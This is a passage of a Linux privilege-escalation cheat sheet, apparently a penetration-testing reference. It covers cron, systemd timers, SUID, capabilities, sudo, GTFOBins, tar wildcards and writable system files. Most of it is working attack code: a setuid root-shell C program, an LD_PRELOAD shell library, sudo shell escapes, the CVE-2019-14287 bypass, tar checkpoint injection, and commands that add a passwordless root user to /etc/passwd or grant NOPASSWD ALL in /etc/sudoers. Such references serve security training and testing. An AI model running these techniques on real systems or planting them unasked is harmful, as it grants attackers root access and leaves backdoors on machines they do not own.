<p>And you should connect without requiring a password. If stuck, the <code class="language-plaintext highlighter-rouge">-vvv</code> verbosity should provide enough details as to why.</p>

<h2 id="scheduled-tasks">Scheduled tasks</h2>

<h3 id="cron-jobs">Cron jobs</h3>

<p>Check if you have access with write permission on these files. <br />
Check inside the file, to find other paths with write permissions.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre></td><td class="rouge-code"><pre><span class="n">/etc/init.d</span><span class="w">
</span><span class="nx">/etc/cron</span><span class="o">*</span><span class="w">
</span><span class="n">/etc/crontab</span><span class="w">
</span><span class="nx">/etc/cron.allow</span><span class="w">
</span><span class="n">/etc/cron.d</span><span class="w"> 
</span><span class="n">/etc/cron.deny</span><span class="w">
</span><span class="nx">/etc/cron.daily</span><span class="w">
</span><span class="n">/etc/cron.hourly</span><span class="w">
</span><span class="nx">/etc/cron.monthly</span><span class="w">
</span><span class="n">/etc/cron.weekly</span><span class="w">
</span><span class="nx">/etc/sudoers</span><span class="w">
</span><span class="n">/etc/exports</span><span class="w">
</span><span class="nx">/etc/anacrontab</span><span class="w">
</span><span class="n">/var/spool/cron</span><span class="w">
</span><span class="nx">/var/spool/cron/crontabs/root</span><span class="w">

</span><span class="n">crontab</span><span class="w"> </span><span class="nt">-l</span><span class="w">
</span><span class="n">ls</span><span class="w"> </span><span class="nt">-alh</span><span class="w"> </span><span class="nx">/var/spool/cron</span><span class="p">;</span><span class="w">
</span><span class="n">ls</span><span class="w"> </span><span class="nt">-al</span><span class="w"> </span><span class="nx">/etc/</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="nx">cron</span><span class="w">
</span><span class="n">ls</span><span class="w"> </span><span class="nt">-al</span><span class="w"> </span><span class="nx">/etc/cron</span><span class="o">*</span><span class="w">
</span><span class="n">cat</span><span class="w"> </span><span class="nx">/etc/cron</span><span class="o">*</span><span class="w">
</span><span class="n">cat</span><span class="w"> </span><span class="nx">/etc/at.allow</span><span class="w">
</span><span class="n">cat</span><span class="w"> </span><span class="nx">/etc/at.deny</span><span class="w">
</span><span class="n">cat</span><span class="w"> </span><span class="nx">/etc/cron.allow</span><span class="w">
</span><span class="n">cat</span><span class="w"> </span><span class="nx">/etc/cron.deny</span><span class="o">*</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>You can use <a href="https://github.com/DominicBreuker/pspy">pspy</a> to detect a CRON job.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="c"># print both commands and file system events and scan procfs every 1000 ms (=1sec)</span><span class="w">
</span><span class="o">.</span><span class="n">/pspy64</span><span class="w"> </span><span class="nt">-pf</span><span class="w"> </span><span class="nt">-i</span><span class="w"> </span><span class="nx">1000</span><span class="w"> 
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="systemd-timers">Systemd timers</h2>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="n">systemctl</span><span class="w"> </span><span class="nx">list-timers</span><span class="w"> </span><span class="nt">--all</span><span class="w">
</span><span class="n">NEXT</span><span class="w">                          </span><span class="nx">LEFT</span><span class="w">     </span><span class="nx">LAST</span><span class="w">                          </span><span class="nx">PASSED</span><span class="w">             </span><span class="nx">UNIT</span><span class="w">                         </span><span class="nx">ACTIVATES</span><span class="w">
</span><span class="n">Mon</span><span class="w"> </span><span class="nx">2019-04-01</span><span class="w"> </span><span class="nx">02:59:14</span><span class="w"> </span><span class="nx">CEST</span><span class="w">  </span><span class="nx">15h</span><span class="w"> </span><span class="nx">left</span><span class="w"> </span><span class="nx">Sun</span><span class="w"> </span><span class="nx">2019-03-31</span><span class="w"> </span><span class="nx">10:52:49</span><span class="w"> </span><span class="nx">CEST</span><span class="w">  </span><span class="nx">24min</span><span class="w"> </span><span class="nx">ago</span><span class="w">          </span><span class="nx">apt-daily.timer</span><span class="w">              </span><span class="nx">apt-daily.service</span><span class="w">
</span><span class="n">Mon</span><span class="w"> </span><span class="nx">2019-04-01</span><span class="w"> </span><span class="nx">06:20:40</span><span class="w"> </span><span class="nx">CEST</span><span class="w">  </span><span class="nx">19h</span><span class="w"> </span><span class="nx">left</span><span class="w"> </span><span class="nx">Sun</span><span class="w"> </span><span class="nx">2019-03-31</span><span class="w"> </span><span class="nx">10:52:49</span><span class="w"> </span><span class="nx">CEST</span><span class="w">  </span><span class="nx">24min</span><span class="w"> </span><span class="nx">ago</span><span class="w">          </span><span class="nx">apt-daily-upgrade.timer</span><span class="w">      </span><span class="nx">apt-daily-upgrade.service</span><span class="w">
</span><span class="n">Mon</span><span class="w"> </span><span class="nx">2019-04-01</span><span class="w"> </span><span class="nx">07:36:10</span><span class="w"> </span><span class="nx">CEST</span><span class="w">  </span><span class="nx">20h</span><span class="w"> </span><span class="nx">left</span><span class="w"> </span><span class="nx">Sat</span><span class="w"> </span><span class="nx">2019-03-09</span><span class="w"> </span><span class="nx">14:28:25</span><span class="w"> </span><span class="nx">CET</span><span class="w">   </span><span class="nx">3</span><span class="w"> </span><span class="nx">weeks</span><span class="w"> </span><span class="nx">0</span><span class="w"> </span><span class="nx">days</span><span class="w"> </span><span class="nx">ago</span><span class="w"> </span><span class="nx">systemd-tmpfiles-clean.timer</span><span class="w"> </span><span class="nx">systemd-tmpfiles-clean.service</span><span class="w">

</span><span class="mi">3</span><span class="w"> </span><span class="n">timers</span><span class="w"> </span><span class="nx">listed.</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="suid">SUID</h2>

<p>SUID/Setuid stands for “set user ID upon execution”, it is enabled by default in every Linux distributions. If a file with this bit is ran, the uid will be changed by the owner one. If the file owner is <code class="language-plaintext highlighter-rouge">root</code>, the uid will be changed to <code class="language-plaintext highlighter-rouge">root</code> even if it was executed from user <code class="language-plaintext highlighter-rouge">bob</code>. SUID bit is represented by an <code class="language-plaintext highlighter-rouge">s</code>.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="err">╭─</span><span class="n">swissky</span><span class="err">@</span><span class="nx">lab</span><span class="w"> </span><span class="nx">~</span><span class="w">  
</span><span class="err">╰─$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="nx">/usr/bin/sudo</span><span class="w"> </span><span class="nt">-alh</span><span class="w">                  
</span><span class="nt">-rwsr-xr-x</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="nx">root</span><span class="w"> </span><span class="nx">138K</span><span class="w"> </span><span class="nx">23</span><span class="w"> </span><span class="nx">nov.</span><span class="w">  </span><span class="nx">16:04</span><span class="w"> </span><span class="nx">/usr/bin/sudo</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h3 id="find-suid-binaries">Find SUID binaries</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>find / <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-type</span> f <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-la</span> <span class="o">{}</span> 2&gt;/dev/null <span class="se">\;</span>
find / <span class="nt">-uid</span> 0 <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-type</span> f 2&gt;/dev/null
</pre></td></tr></tbody></table></code></div></div>

<h3 id="create-a-suid-binary">Create a SUID binary</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>print <span class="s1">'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}'</span> <span class="o">&gt;</span> /tmp/suid.c   
gcc <span class="nt">-o</span> /tmp/suid /tmp/suid.c  
<span class="nb">sudo chmod</span> +x /tmp/suid <span class="c"># execute right</span>
<span class="nb">sudo chmod</span> +s /tmp/suid <span class="c"># setuid bit</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="capabilities">Capabilities</h2>

<h3 id="list-capabilities-of-binaries">List capabilities of binaries</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>╭─swissky@lab ~  
╰─<span class="nv">$ </span>/usr/bin/getcap <span class="nt">-r</span>  /usr/bin
/usr/bin/fping                <span class="o">=</span> cap_net_raw+ep
/usr/bin/dumpcap              <span class="o">=</span> cap_dac_override,cap_net_admin,cap_net_raw+eip
/usr/bin/gnome-keyring-daemon <span class="o">=</span> cap_ipc_lock+ep
/usr/bin/rlogin               <span class="o">=</span> cap_net_bind_service+ep
/usr/bin/ping                 <span class="o">=</span> cap_net_raw+ep
/usr/bin/rsh                  <span class="o">=</span> cap_net_bind_service+ep
/usr/bin/rcp                  <span class="o">=</span> cap_net_bind_service+ep
</pre></td></tr></tbody></table></code></div></div>

<h3 id="edit-capabilities">Edit capabilities</h3>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="n">/usr/bin/setcap</span><span class="w"> </span><span class="nt">-r</span><span class="w"> </span><span class="nx">/bin/ping</span><span class="w">            </span><span class="c"># remove</span><span class="w">
</span><span class="n">/usr/bin/setcap</span><span class="w"> </span><span class="nx">cap_net_raw</span><span class="o">+</span><span class="nx">p</span><span class="w"> </span><span class="nx">/bin/ping</span><span class="w"> </span><span class="c"># add</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h3 id="interesting-capabilities">Interesting capabilities</h3>

<p>Having the capability =ep means the binary has all the capabilities.</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="err">$</span><span class="w"> </span><span class="n">getcap</span><span class="w"> </span><span class="nx">openssl</span><span class="w"> </span><span class="nx">/usr/bin/openssl</span><span class="w"> 
</span><span class="n">openssl</span><span class="o">=</span><span class="n">ep</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Alternatively the following capabilities can be used in order to upgrade your current privileges.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="n">cap_dac_read_search</span><span class="w"> </span><span class="c"># read anything</span><span class="w">
</span><span class="n">cap_setuid</span><span class="o">+</span><span class="nx">ep</span><span class="w"> </span><span class="c"># setuid</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Example of privilege escalation with <code class="language-plaintext highlighter-rouge">cap_setuid+ep</code></p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="err">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="nx">/usr/bin/setcap</span><span class="w"> </span><span class="nx">cap_setuid</span><span class="o">+</span><span class="nx">ep</span><span class="w"> </span><span class="nx">/usr/bin/python2.7</span><span class="w">

</span><span class="err">$</span><span class="w"> </span><span class="n">python2.7</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s1">'import os; os.setuid(0); os.system("/bin/sh")'</span><span class="w">
</span><span class="n">sh-5.0</span><span class="c"># id</span><span class="w">
</span><span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w"> </span><span class="n">gid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">swissky</span><span class="p">)</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<div class="table-wrapper"><table>
  <thead>
    <tr>
      <th>Capabilities name</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>CAP_AUDIT_CONTROL</td>
      <td>Allow to enable/disable kernel auditing</td>
    </tr>
    <tr>
      <td>CAP_AUDIT_WRITE</td>
      <td>Helps to write records to kernel auditing log</td>
    </tr>
    <tr>
      <td>CAP_BLOCK_SUSPEND</td>
      <td>This feature can block system suspends</td>
    </tr>
    <tr>
      <td>CAP_CHOWN</td>
      <td>Allow user to make arbitrary change to files UIDs and GIDs</td>
    </tr>
    <tr>
      <td>CAP_DAC_OVERRIDE</td>
      <td>This helps to bypass file read, write and execute permission checks</td>
    </tr>
    <tr>
      <td>CAP_DAC_READ_SEARCH</td>
      <td>This only bypass file and directory read/execute permission checks</td>
    </tr>
    <tr>
      <td>CAP_FOWNER</td>
      <td>This enables to bypass permission checks on operations that normally require the filesystem UID of the process to match the UID of the file</td>
    </tr>
    <tr>
      <td>CAP_KILL</td>
      <td>Allow the sending of signals to processes belonging to others</td>
    </tr>
    <tr>
      <td>CAP_SETGID</td>
      <td>Allow changing of the GID</td>
    </tr>
    <tr>
      <td>CAP_SETUID</td>
      <td>Allow changing of the UID</td>
    </tr>
    <tr>
      <td>CAP_SETPCAP</td>
      <td>Helps to transferring and removal of current set to any PID</td>
    </tr>
    <tr>
      <td>CAP_IPC_LOCK</td>
      <td>This helps to lock memory</td>
    </tr>
    <tr>
      <td>CAP_MAC_ADMIN</td>
      <td>Allow MAC configuration or state changes</td>
    </tr>
    <tr>
      <td>CAP_NET_RAW</td>
      <td>Use RAW and PACKET sockets</td>
    </tr>
    <tr>
      <td>CAP_NET_BIND_SERVICE</td>
      <td>SERVICE Bind a socket to internet domain privileged ports</td>
    </tr>
  </tbody>
</table></div>

<h2 id="sudo">SUDO</h2>

<p>Tool: <a href="https://github.com/TH3xACE/SUDO_KILLER">Sudo Exploitation</a></p>

<h3 id="nopasswd">NOPASSWD</h3>

<p>Sudo configuration might allow a user to execute some command with another user privileges without knowing the password.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>

User demo may run the following commands on crashlab:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/vim
</pre></td></tr></tbody></table></code></div></div>

<p>In this example the user <code class="language-plaintext highlighter-rouge">demo</code> can run <code class="language-plaintext highlighter-rouge">vim</code> as <code class="language-plaintext highlighter-rouge">root</code>, it is now trivial to get a shell by adding an ssh key into the root directory or by calling <code class="language-plaintext highlighter-rouge">sh</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nb">sudo </span>vim <span class="nt">-c</span> <span class="s1">'!sh'</span>
<span class="nb">sudo</span> <span class="nt">-u</span> root vim <span class="nt">-c</span> <span class="s1">'!sh'</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="ld_preload-and-nopasswd">LD_PRELOAD and NOPASSWD</h3>

<p>If <code class="language-plaintext highlighter-rouge">LD_PRELOAD</code> is explicitly defined in the sudoers file</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">Defaults</span><span class="w">        </span><span class="nx">env_keep</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">LD_PRELOAD</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Compile the following shared object using the C code below with <code class="language-plaintext highlighter-rouge">gcc -fPIC -shared -o shell.so shell.c -nostartfiles</code></p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="c">#include &lt;stdio.h&gt;</span><span class="w">
</span><span class="c">#include &lt;sys/types.h&gt;</span><span class="w">
</span><span class="c">#include &lt;stdlib.h&gt;</span><span class="w">
</span><span class="n">void</span><span class="w"> </span><span class="nx">_init</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
	</span><span class="n">unsetenv</span><span class="p">(</span><span class="s2">"LD_PRELOAD"</span><span class="p">);</span><span class="w">
	</span><span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w">
	</span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w">
	</span><span class="n">system</span><span class="p">(</span><span class="s2">"/bin/sh"</span><span class="p">);</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Execute any binary with the LD_PRELOAD to spawn a shell : <code class="language-plaintext highlighter-rouge">sudo LD_PRELOAD=&lt;full_path_to_so_file&gt; &lt;program&gt;</code>, e.g: <code class="language-plaintext highlighter-rouge">sudo LD_PRELOAD=/tmp/shell.so find</code></p>

<h3 id="doas">Doas</h3>

<p>There are some alternatives to the <code class="language-plaintext highlighter-rouge">sudo</code> binary such as <code class="language-plaintext highlighter-rouge">doas</code> for OpenBSD, remember to check its configuration at <code class="language-plaintext highlighter-rouge">/etc/doas.conf</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>permit nopass demo as root cmd vim
</pre></td></tr></tbody></table></code></div></div>

<h3 id="sudo_inject">sudo_inject</h3>

<p>Using <a href="https://github.com/nongiach/sudo_inject">https://github.com/nongiach/sudo_inject</a></p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="err">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="nx">whatever</span><span class="w">
</span><span class="p">[</span><span class="n">sudo</span><span class="p">]</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">user:</span><span class="w">    
</span><span class="c"># Press &lt;ctrl&gt;+c since you don't have the password. </span><span class="w">
</span><span class="c"># This creates an invalid sudo tokens.</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">sh</span><span class="w"> </span><span class="nx">exploit.sh</span><span class="w">
</span><span class="o">....</span><span class="w"> </span><span class="n">wait</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nx">seconds</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="nt">-i</span><span class="w"> </span><span class="c"># no password required :)</span><span class="w">
</span><span class="c"># id</span><span class="w">
</span><span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w"> </span><span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w"> </span><span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Slides of the presentation : <a href="https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf">https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf</a></p>

<h3 id="cve-2019-14287">CVE-2019-14287</h3>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="c"># Exploitable when a user have the following permissions (sudo -l)</span><span class="w">
</span><span class="p">(</span><span class="n">ALL</span><span class="p">,</span><span class="w"> </span><span class="o">!</span><span class="nx">root</span><span class="p">)</span><span class="w"> </span><span class="n">ALL</span><span class="w">

</span><span class="c"># If you have a full TTY, you can exploit it like this</span><span class="w">
</span><span class="n">sudo</span><span class="w"> </span><span class="nt">-u</span><span class="c">#-1 /bin/bash</span><span class="w">
</span><span class="n">sudo</span><span class="w"> </span><span class="nt">-u</span><span class="c">#4294967295 id</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="gtfobins">GTFOBins</h2>

<p><a href="https://gtfobins.github.io">GTFOBins</a> is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.</p>

<p>The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.</p>

<blockquote>
  <p>gdb -nx -ex ‘!sh’ -ex quit  <br />
sudo mysql -e ‘! /bin/sh’  <br />
strace -o /dev/null /bin/sh  <br />
sudo awk ‘BEGIN {system(“/bin/sh”)}’</p>
</blockquote>

<h2 id="wildcard">Wildcard</h2>

<p>By using tar with –checkpoint-action options, a specified action can be used after a checkpoint. This action could be a malicious shell script that could be used for executing arbitrary commands under the user who starts tar. “Tricking” root to use the specific options is quite easy, and that’s where the wildcard comes in handy.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="c"># create file for exploitation</span><span class="w">
</span><span class="n">touch</span><span class="w"> </span><span class="o">--</span><span class="w"> </span><span class="s2">"--checkpoint=1"</span><span class="w">
</span><span class="n">touch</span><span class="w"> </span><span class="o">--</span><span class="w"> </span><span class="s2">"--checkpoint-action=exec=sh shell.sh"</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="s2">"#\!/bin/bash\ncat /etc/passwd &gt; /tmp/flag\nchmod 777 /tmp/flag"</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">shell.sh</span><span class="w">

</span><span class="c"># vulnerable script</span><span class="w">
</span><span class="n">tar</span><span class="w"> </span><span class="nx">cf</span><span class="w"> </span><span class="nx">archive.tar</span><span class="w"> </span><span class="o">*</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Tool: <a href="https://github.com/localh0t/wildpwn">wildpwn</a></p>

<h2 id="writable-files">Writable files</h2>

<p>List world writable files on the system.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="n">find</span><span class="w"> </span><span class="nx">/</span><span class="w"> </span><span class="nt">-writable</span><span class="w"> </span><span class="o">!</span><span class="w"> </span><span class="nt">-user</span><span class="w"> </span><span class="se">`w</span><span class="nx">hoami</span><span class="se">` </span><span class="nt">-type</span><span class="w"> </span><span class="nx">f</span><span class="w"> </span><span class="o">!</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="s2">"/proc/*"</span><span class="w"> </span><span class="o">!</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="s2">"/sys/*"</span><span class="w"> </span><span class="nt">-exec</span><span class="w"> </span><span class="nx">ls</span><span class="w"> </span><span class="nt">-al</span><span class="w"> </span><span class="p">{}</span><span class="w"> </span><span class="n">\</span><span class="p">;</span><span class="w"> </span><span class="mi">2</span><span class="err">&gt;</span><span class="n">/dev/null</span><span class="w">
</span><span class="nx">find</span><span class="w"> </span><span class="nx">/</span><span class="w"> </span><span class="nt">-perm</span><span class="w"> </span><span class="nt">-2</span><span class="w"> </span><span class="nt">-type</span><span class="w"> </span><span class="nx">f</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="nx">/dev/null</span><span class="w">
</span><span class="n">find</span><span class="w"> </span><span class="nx">/</span><span class="w"> </span><span class="o">!</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="s2">"*/proc/*"</span><span class="w"> </span><span class="nt">-perm</span><span class="w"> </span><span class="nt">-2</span><span class="w"> </span><span class="nt">-type</span><span class="w"> </span><span class="nx">f</span><span class="w"> </span><span class="nt">-print</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="nx">/dev/null</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h3 id="writable-etcsysconfignetwork-scripts-centosredhat">Writable /etc/sysconfig/network-scripts/ (Centos/Redhat)</h3>

<p>/etc/sysconfig/network-scripts/ifcfg-1337 for example</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="n">NAME</span><span class="o">=</span><span class="n">Network</span><span class="w"> </span><span class="nx">/bin/id</span><span class="w">  </span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">=</span><span class="w"> </span><span class="n">Note</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">blank</span><span class="w"> </span><span class="nx">space</span><span class="w">
</span><span class="n">ONBOOT</span><span class="o">=</span><span class="n">yes</span><span class="w">
</span><span class="nx">DEVICE</span><span class="o">=</span><span class="n">eth0</span><span class="w">

</span><span class="n">EXEC</span><span class="w"> </span><span class="p">:</span><span class="w">
</span><span class="o">.</span><span class="n">/etc/sysconfig/network-scripts/ifcfg-1337</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>
<p>src : <a href="https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f">https://vulmon.com/exploitdetailsqidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f</a></p>

<h3 id="writable-etcpasswd">Writable /etc/passwd</h3>

<p>First generate a password with one of the following commands.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="n">openssl</span><span class="w"> </span><span class="nx">passwd</span><span class="w"> </span><span class="nt">-1</span><span class="w"> </span><span class="nt">-salt</span><span class="w"> </span><span class="nx">hacker</span><span class="w"> </span><span class="nx">hacker</span><span class="w">
</span><span class="n">mkpasswd</span><span class="w"> </span><span class="nt">-m</span><span class="w"> </span><span class="nx">SHA-512</span><span class="w"> </span><span class="nx">hacker</span><span class="w">
</span><span class="n">python2</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s1">'import crypt; print crypt.crypt("hacker", "$6$salt")'</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Then add the user <code class="language-plaintext highlighter-rouge">hacker</code> and add the generated password.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>E.g: <code class="language-plaintext highlighter-rouge">hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash</code></p>

<p>You can now use the <code class="language-plaintext highlighter-rouge">su</code> command with <code class="language-plaintext highlighter-rouge">hacker:hacker</code></p>

<p>Alternatively you can use the following lines to add a dummy user without a password.  <br />
WARNING: you might degrade the current security of the machine.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="n">echo</span><span class="w"> </span><span class="s1">'dummy::0:0::/root:/bin/bash'</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="nx">/etc/passwd</span><span class="w">
</span><span class="n">su</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">dummy</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>NOTE: In BSD platforms <code class="language-plaintext highlighter-rouge">/etc/passwd</code> is located at <code class="language-plaintext highlighter-rouge">/etc/pwd.db</code> and <code class="language-plaintext highlighter-rouge">/etc/master.passwd</code>, also the <code class="language-plaintext highlighter-rouge">/etc/shadow</code> is renamed to <code class="language-plaintext highlighter-rouge">/etc/spwd.db</code>.</p>

<h3 id="writable-etcsudoers">Writable /etc/sudoers</h3>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="n">echo</span><span class="w"> </span><span class="s2">"username ALL=(ALL:ALL) ALL"</span><span class="err">&gt;&gt;</span><span class="nx">/etc/sudoers</span><span class="w">

</span><span class="c"># use SUDO without password</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="s2">"username ALL=(ALL) NOPASSWD: ALL"</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="nx">/etc/sudoers</span><span class="w">
